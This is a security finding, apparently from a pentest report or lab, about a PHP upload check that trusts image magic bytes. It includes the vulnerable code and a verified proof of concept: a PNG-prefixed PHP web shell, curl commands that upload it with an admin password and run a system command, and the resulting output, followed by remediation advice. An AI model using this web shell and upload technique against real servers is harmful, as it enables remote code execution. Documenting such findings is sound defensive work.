# 36 — Upload validation trusts magic bytes only

- **OWASP Top 10 (2021):** A08:2021 – Software and Data Integrity Failures
- **Severity:** Medium
- **Difficulty:** Easy

## Where

`web/panel/upload.php:22-34` — image validation:

```php
$tmp = $_FILES['file']['tmp_name'];
$fh = fopen($tmp, 'r');
$magic = fread($fh, 16);
fclose($fh);
$isimg = false;
if (substr($magic, 0, 8) == "\x89PNG\r\n\x1a\n") $isimg = true;
if (substr($magic, 0, 3) == "\xFF\xD8\xFF")      $isimg = true;
if (substr($magic, 0, 4) == 'GIF8')              $isimg = true;
if (!$isimg) {
    $err = t('upload_not_image');
} else {
    $name = basename($_FILES['file']['name']);
    move_uploaded_file($tmp, UPLOAD_DIR . $name);
}
```

## How it works (root cause)

The upload filter treats the first few magic bytes as proof that the file is
an image. It does not reject executable extensions, does not re-encode the
file, and does not store it outside the web root. A polyglot file that starts
with a PNG header but contains PHP code passes validation and is executed by
nginx (16).

## Exploitation steps

1. Build a PNG-prefixed PHP file:

   ```bash
   printf '\x89PNG\r\n\x1a\n' > pwn.php
   printf '<?php system($_GET["c"]); ?>' >> pwn.php
   ```

2. Upload it as admin:

   ```bash
   curl -s -b /tmp/admin.jar \
     -F "upload_password=Aragorn2025!" \
     -F "file=@pwn.php;filename=pwn.php" \
     http://localhost:8080/panel/upload.php
   ```

3. Execute it:

   ```bash
   curl -s 'http://localhost:8080/uploads/pwn.php?c=id'
   ```

## Working PoC (verified)

The upload succeeds and the uploaded file executes:

```text
uid=1000(user) gid=1000(user) groups=1000(user),...
```

## Expected result / verification

- A file with a PNG header and a `.php` extension is accepted.
- The file is stored in the web root and executed by php-fpm.

## Attack chain

```
magic-byte-only validation (this finding)
  → polyglot .php upload
  → nginx executes it (16)
  → RCE
```

## Notes

- This is the control-level finding behind the RCE in 16.
- Proper validation would reject executable extensions, re-encode images, and
  store uploads outside the executable web root.
